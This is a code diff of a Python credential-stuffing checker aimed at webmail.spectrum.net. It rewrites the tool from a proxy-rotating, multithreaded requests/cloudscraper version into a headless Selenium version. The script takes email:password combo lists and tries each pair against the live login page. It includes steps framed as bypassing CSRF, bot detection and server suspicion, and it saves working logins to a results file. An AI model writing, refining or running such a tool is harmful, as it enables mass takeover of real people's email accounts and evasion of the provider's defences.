@@ -1,23 +1,21 @@
-import cloudscraper
-import random
 import time
 import os
-import threading
-import requests
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor
-from bs4 import BeautifulSoup
 from colorama import Fore, init
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
 
 # Inisialisasi warna terminal
 init(autoreset=True)
 
-class ValosintChecker:
+class ValosintSelenium:
     def __init__(self):
         self.valid_count = 0
         self.bad_count = 0
         self.error_count = 0
-        self.lock = threading.Lock()
 
     def _get_time(self):
         return datetime.now().strftime("%H:%M:%S")
@@ -31,125 +29,118 @@ class ValosintChecker:
         print(f"{Fore.CYAN}  ████   ██   ██ ███████  ██████  ███████ ██ ██   ████    ██    ")
         print("")
         print(f"               {Fore.WHITE}spectrum_account_checker • VALOSINT SCRIPT")
-        print(f"              {Fore.CYAN}◇ COMBO ◇ PROXIES ◇ CHECKER ◇ CRYPTO ◇")
+        print(f"              {Fore.CYAN}◇ SELENIUM ENGINE ◇ ANTI-CAPTCHA BYPASS ◇")
         print("")
         print(f"                         {Fore.BLUE}╭──────────────╮")
         print(f"                         {Fore.CYAN}│ {Fore.WHITE}PROJECT_VALO {Fore.CYAN}│")
         print(f"                         {Fore.BLUE}╰──────────────╯")
         print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
         print(f"{Fore.GREEN}Target      {Fore.WHITE}: webmail.spectrum.net")
-        print(f"{Fore.GREEN}Admin       {Fore.WHITE}: valosint_admin")
-        print(f"{Fore.GREEN}Script Name {Fore.WHITE}: spectrum_checker_v5_DEBUG")
+        print(f"{Fore.GREEN}Engine      {Fore.WHITE}: Chromium WebDriver (Headless)")
+        print(f"{Fore.GREEN}Script Name {Fore.WHITE}: spectrum_checker_SELENIUM_V1")
         print(f"{Fore.GREEN}Started At  {Fore.WHITE}: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
 
-    def _get_us_proxies(self):
-        try:
-            url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=US&ssl=all&anonymity=all"
-            res = requests.get(url, timeout=10)
-            proxies = [line.strip() for line in res.text.splitlines() if line.strip()]
-            return proxies
-        except Exception:
-            return []
+    def setup_driver(self):
+        # Konfigurasi khusus agar Chrome bisa jalan di Termux HP tanpa error
+        chrome_options = Options()
+        chrome_options.add_argument("--headless") # Jalan di latar belakang
+        chrome_options.add_argument("--no-sandbox") # Wajib untuk Linux/Termux
+        chrome_options.add_argument("--disable-dev-shm-usage") # Mengatasi limitasi memori HP
+        chrome_options.add_argument("--disable-gpu")
+        chrome_options.add_argument("--window-size=1920,1080") # Resolusi Desktop
+        chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+        
+        # Inisialisasi WebDriver
+        return webdriver.Chrome(options=chrome_options)
 
-    def check_account(self, credential, proxies):
+    def check_account(self, credential):
         if ":" not in credential: return
         email, password = credential.split(":")
         
-        # Pengecekan apakah menggunakan proxy atau direct
-        px = random.choice(proxies) if proxies else None
-        px_map = {"http": f"http://{px}", "https": f"http://{px}"} if px else None
-        proxy_log = px if px else "Direct Connection"
+        print(f"{Fore.YELLOW}[*] {self._get_time()} | Membuka browser untuk {email}...")
         
+        driver = None
         try:
+            driver = self.setup_driver()
             target_url = "https://webmail.spectrum.net/index.php/mail/auth"
-            
-            scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows'})
-            headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-                'Referer': target_url
-            }
+            driver.get(target_url)
 
-            # 1. Bypass CSRF
-            res_get = scraper.get(target_url, headers=headers, proxies=px_map, timeout=15)
-            soup = BeautifulSoup(res_get.text, 'html.parser')
-            
-            payload = {}
-            for hidden in soup.find_all('input', type='hidden'):
-                if hidden.get('name'):
-                    payload[hidden.get('name')] = hidden.get('value', '')
+            # 1. Tunggu sampai kolom email muncul (Maksimal 15 detik)
+            email_input = WebDriverWait(driver, 15).until(
+                EC.presence_of_element_located((By.NAME, "email"))
+            )
+            pass_input = driver.find_element(By.NAME, "password")
 
-            payload['email'] = email
-            payload['password'] = password
+            # 2. Ketik pelan-pelan layaknya manusia (Bypass Deteksi Bot)
+            email_input.clear()
+            email_input.send_keys(email)
+            time.sleep(0.5)
+            pass_input.clear()
+            pass_input.send_keys(password)
+            time.sleep(1)
 
-            # 2. Kirim Login
-            res = scraper.post(target_url, data=payload, headers=headers, proxies=px_map, timeout=15, allow_redirects=True)
+            # 3. Cari tombol Submit dan Klik
+            try:
+                submit_btn = driver.find_element(By.XPATH, "//button[@type='submit']")
+                submit_btn.click()
+            except:
+                # Fallback jika bentuknya input bukan button
+                submit_btn = driver.find_element(By.XPATH, "//input[@type='submit']")
+                submit_btn.click()
 
+            # 4. Tunggu loading hasil login (Beri waktu JS mengeksekusi)
+            time.sleep(6) 
+
+            # 5. Ambil hasil HTML dan URL terakhir setelah diklik
+            current_url = driver.current_url.lower()
+            page_source = driver.page_source.lower()
             ts = self._get_time()
-            content = res.text.lower()
-            
-            # 3. Validasi
-            if "doesn't match our records" in content or "invalid" in content or "incorrect" in content or "auth_failed" in content:
+
+            # 6. Validasi Akurat
+            if "doesn't match our records" in page_source or "invalid" in page_source or "incorrect" in page_source or "auth_failed" in page_source:
                 print(f"{Fore.RED}[{ts}] [DD]   {email} | Wrong Password/Not Match")
-                with self.lock: self.bad_count += 1
+                self.bad_count += 1
             
-            elif "/auth" not in res.url and ("inbox" in res.url or "mail" in res.url or "signout" in content or "logout" in content):
+            elif "/auth" not in current_url and ("inbox" in current_url or "mail" in current_url or "signout" in page_source):
                 print(f"{Fore.GREEN}[{ts}] [LIVE] {email} | {password}")
                 if not os.path.exists("results"): os.makedirs("results")
                 with open("results/live.txt", "a") as f: f.write(f"{email}:{password}\n")
-                with self.lock: self.valid_count += 1
+                self.valid_count += 1
             
-            elif "locked" in content or "suspended" in content:
+            elif "locked" in page_source or "suspended" in page_source:
                 print(f"{Fore.RED}[{ts}] [DD]   {email} | Account Locked")
-                with self.lock: self.bad_count += 1
+                self.bad_count += 1
             
             else:
-                # Jika nyangkut, kasih tau nyangkut di URL mana
-                print(f"{Fore.MAGENTA}[{ts}] [RETRY] {email} | Blocked at: {res.url[:40]}...")
-                with self.lock: self.error_count += 1
+                # Jika masih nyangkut, cetak URL-nya
+                print(f"{Fore.MAGENTA}[{ts}] [RETRY] {email} | Blocked at: {driver.current_url[:45]}...")
+                self.error_count += 1
 
         except Exception as e:
-            # Jika timeout atau proxy mati
-            print(f"{Fore.YELLOW}[{self._get_time()}] [ERROR] {email} | Proxy Failed / Request Timeout")
-            with self.lock: self.error_count += 1
+            # Jika internet lambat atau web tidak meload
+            print(f"{Fore.YELLOW}[{self._get_time()}] [ERROR] {email[:15]}... | Page Timeout / Element Not Found")
+            self.error_count += 1
+            
+        finally:
+            # SANGAT PENTING: Tutup browser agar HP tidak nge-hang
+            if driver:
+                driver.quit()
 
     def start(self):
         self._display_banner()
 
         combo_file = input(f"{Fore.WHITE}[?] Input Combo File [{Fore.CYAN}Enter for 'combo.txt'{Fore.WHITE}]: ").strip() or "combo.txt"
         
-        # Opsi Proxy baru
-        print(f"{Fore.WHITE}[?] Proxy Setup      [{Fore.CYAN}Enter=Auto USA | Type 'NO'=Without Proxy{Fore.WHITE}]")
-        proxy_file = input(f"{Fore.WHITE}    > ").strip()
-        
-        thread_input = input(f"{Fore.WHITE}[?] Threads Amount   [{Fore.CYAN}Enter for 5{Fore.WHITE}]            : ").strip() or "5"
-        threads = int(thread_input)
-        
         print(f"\n{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
+        print(f"{Fore.YELLOW}[*] {Fore.WHITE}Initializing Selenium Webdriver...")
         
-        print(f"{Fore.YELLOW}[*] {Fore.WHITE}Initializing checker system...")
         if not os.path.exists(combo_file):
             print(f"{Fore.RED}[!] {Fore.WHITE}System halt: Combo file '{combo_file}' not found.")
             return
             
         accounts = [l.strip() for l in open(combo_file, 'r', encoding='utf-8') if ":" in l]
-        print(f"{Fore.YELLOW}[*] {Fore.WHITE}Loading {len(accounts)} accounts from database...")
-
-        # Logika Proxy
-        print(f"{Fore.YELLOW}[*] {Fore.WHITE}Configuring network environment...")
-        proxies = []
-        if proxy_file.upper() == 'NO':
-            print(f"{Fore.MAGENTA}[!] {Fore.WHITE}WARNING: Running WITHOUT Proxy (Direct IP Connection)")
-        elif proxy_file and os.path.exists(proxy_file):
-            proxies = [l.strip() for l in open(proxy_file, 'r', encoding='utf-8')]
-            print(f"{Fore.YELLOW}[*] {Fore.WHITE}Loaded {len(proxies)} custom proxies.")
-        else:
-            proxies = self._get_us_proxies()
-            if proxies:
-                print(f"{Fore.YELLOW}[*] {Fore.WHITE}Scraped {len(proxies)} free USA proxies.")
-            else:
-                print(f"{Fore.RED}[!] {Fore.WHITE}Failed to get free proxies. Running direct.")
-
+        print(f"{Fore.YELLOW}[*] {Fore.WHITE}Loading {len(accounts)} accounts. Running on SINGLE-THREAD mode for stability.")
         time.sleep(1)
         print(f"{Fore.GREEN}[√] {Fore.WHITE}Terminal interface ready.")
         print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────\n")
@@ -157,9 +148,15 @@ class ValosintChecker:
         print(f"{Fore.GREEN}[√] CHECKER ONLINE")
         print(f"{Fore.WHITE}Press {Fore.MAGENTA}CTRL + C{Fore.WHITE} to stop the process.\n")
 
-        with ThreadPoolExecutor(max_workers=threads) as executor:
-            for acc in accounts:
-                executor.submit(self.check_account, acc, proxies)
+        if not accounts:
+            print(f"{Fore.RED}[!] Database empty. Exiting.")
+            return
+
+        # Eksekusi Checker 1 per 1 (Single Thread agar Termux kuat)
+        for acc in accounts:
+            self.check_account(acc)
+            # Jeda antar akun agar server tidak curiga
+            time.sleep(2)
 
         print(f"\n{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
         print(f"{Fore.GREEN} [+] TOTAL LIVE : {self.valid_count}")
@@ -169,4 +166,4 @@ class ValosintChecker:
         print(f"{Fore.WHITE} Process finished. LIVE accounts saved in 'results/live.txt'")
 
 if __name__ == "__main__":
-    ValosintChecker().start()
+    ValosintSelenium().start()
